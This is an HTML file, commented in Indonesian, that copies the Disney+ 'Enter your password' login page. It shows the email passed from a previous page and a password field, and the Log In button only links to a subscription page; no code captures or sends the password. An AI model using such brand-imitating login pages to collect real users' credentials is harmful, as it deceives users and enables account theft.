<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Password - Disney+</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #062e3f 0%, #0d4f5c 35%, #0f5c68 50%, #0a3f52 75%, #072840 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Logo Disney+ di atas kartu */
        .logo-atas {
            margin-bottom: 24px;
            text-align: center;
        }

        .logo-atas img {
            height: 42px;
            width: auto;
        }

        .login-card {
            background: #ffffff;
            width: 100%;
            max-width: 410px;
            padding: 36px 32px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
            text-align: left;
        }

        /* Logo MyDisney di dalam kartu */
        .logo-dalam {
            margin-bottom: 18px;
        }

        .logo-dalam img {
            height: 26px;
            width: auto;
        }

        h1 {
            font-size: 22px;
            font-weight: 600;
            color: #000000;
            line-height: 1.3;
            margin-bottom: 8px;
        }

        .email-terdaftar {
            font-size: 14px;
            color: #555555;
            margin-bottom: 24px;
        }

        /* Kolom Kata Sandi */
        .password-wrapper {
            position: relative;
            margin-bottom: 10px;
        }

        .password-input {
            width: 100%;
            padding: 13px 50px 13px 12px;
            background: #f0f0f2;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            outline: none;
            transition: background 0.2s;
        }

        .password-input:focus {
            background: #e8e8eb;
        }

        .tombol-lihat {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 14px;
            color: #0063e5;
            cursor: pointer;
        }

        .lupa-kata-sandi {
            display: inline-block;
            font-size: 14px;
            color: #0063e5;
            text-decoration: none;
            margin: 8px 0 28px 0;
        }

        .lupa-kata-sandi:hover {
            text-decoration: underline;
        }

        /* Tombol Masuk */
        .btn-masuk {
            width: 100%;
            padding: 14px;
            background: #000000;
            color: #ffffff;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background 0.2s;
        }

        .btn-masuk:hover {
            background: #222222;
        }

        .divider-line {
            border-bottom: 1px solid #e5e5e5;
            margin-bottom: 16px;
        }

        .note-text {
            font-size: 12px;
            color: #555555;
            line-height: 1.5;
            margin-bottom: 18px;
        }

        /* Logo Sponsor di bawah */
        .sponsor-logo {
            margin-top: 8px;
            text-align: center;
        }

        .sponsor-logo img {
            height: 34px;
            width: auto;
            opacity: 0.85;
        }
    </style>
</head>
<body>

    <!-- Logo Disney+ di atas kartu -->
    <div class="logo-atas">
        <img src="img/disney+.png" alt="Disney+">
    </div>

    <div class="login-card">
        <!-- Logo MyDisney di dalam kartu -->
        <div class="logo-dalam">
            <img src="img/mydisney.png" alt="MyDisney">
        </div>

        <h1>Enter your password</h1>

        <!-- Email dari halaman pertama muncul otomatis di sini -->
        <p class="email-terdaftar" id="tampilEmail"></p>

        <div class="password-wrapper">
            <input type="password" class="password-input" id="kataSandi" placeholder="Password">
            <button type="button" class="tombol-lihat" id="tombolLihat">Show</button>
        </div>

        <a href="#" class="lupa-kata-sandi">Forgot your password?</a>

        <button class="btn-masuk" onclick="window.location.href='berlangganan.html'">Log In</button>

        <div class="divider-line"></div>

        <p class="note-text">
            Disney+ is part of The Walt Disney Family of Companies.
        </p>

        <!-- Logo Sponsor di bawah kartu -->
        <div class="sponsor-logo">
            <img src="img/sponsor.png" alt="Sponsor Logo">
        </div>
    </div>

    <!-- Tampilkan Email yang dikirim dari halaman pertama -->
    <script>
        const emailYangDikirim = localStorage.getItem('emailYangDikirim');
        if (emailYangDikirim) {
            document.getElementById('tampilEmail').textContent = emailYangDikirim;
        }
    </script>

    <!-- Fungsi Tampilkan/Sembunyikan Kata Sandi -->
    <script>
        const inputSandi = document.getElementById('kataSandi');
        const tombolLihat = document.getElementById('tombolLihat');

        tombolLihat.addEventListener('click', function() {
            if (inputSandi.type === 'password') {
                inputSandi.type = 'text';
                tombolLihat.textContent = 'Hide';
            } else {
                inputSandi.type = 'password';
                tombolLihat.textContent = 'Show';
            }
        });
    </script>

</body>
</html>
